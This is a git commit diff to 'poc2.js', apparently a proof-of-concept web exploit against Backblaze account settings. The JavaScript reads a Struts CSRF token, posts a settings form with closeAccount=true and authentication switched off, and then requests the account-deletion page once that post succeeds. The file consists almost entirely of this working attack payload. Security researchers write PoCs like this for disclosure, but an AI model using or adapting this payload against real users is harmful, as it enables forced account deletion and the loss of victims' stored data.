e2da60434342d1f04dd33d926073fac0297703df
marcelo321 <tomibegher@gmail.com>
2020-06-18 02:04:29 -0300

    Update poc2.js

--- poc2.js
+++ poc2.js
@@ -16,9 +16,14 @@ var xhr = new XMLHttpRequest();
                 xhr2.setRequestHeader("Content-Type", 'application/x-www-form-urlencoded; charset=UTF-8');
                 xhr2.send('org.apache.struts.taglib.html.TOKEN='+token+'&originalLangLocale=en_US&signinMethod=never&langLocale=en_US&originalEmailReceipts=false&enabledComputerBackup=on&originalComputerBackup=true&originalB2CloudStorage=false&originalGroups=false&originalEnableSso=false&enableSso=false&oauthSsoProvider=&currentPasswordChangeEmail=&newEmail=&confirmNewEmail=&changeEmail=&currentPassword=&password=&confirmPassword=&changePassword=&currentPasswordChangeSMS=&smsPhoneNumber=&smsSecurityCode%22=&verifiedSmsPhoneNumber=&verifiedSmsCountryCode=&changeSmsPhoneNumber=&current_verify_email=&verifyEmailSecurityCode%22=&authenticate=never&totpVerificationCode=&genBackupCodes=on&authKey=&totpHash=&originalEnabledSmsFallback=false&removePhoneNumber=&closeAccount=true&changeAuthSettings=&authSettings=&authMethod=&smsBackupCodes=');
             
-            var xhr3 = new XMLHttpRequest();
-                xhr3.open("GET", "https://www.backblaze.com/delete-account.html", true);
-                xhr3.send(null);
+                xhr2.onload = function(e){
+                    if( xhr2.readyState == XMLHttpRequest.DONE && xhr2.status == 200 )
+                    {
+                        var xhr3 = new XMLHttpRequest();
+                        xhr3.open("GET", "https://www.backblaze.com/delete-account.html", true);
+                        xhr3.send(null);
+                    }
+                }
         }
     };
     xhr.send(null);
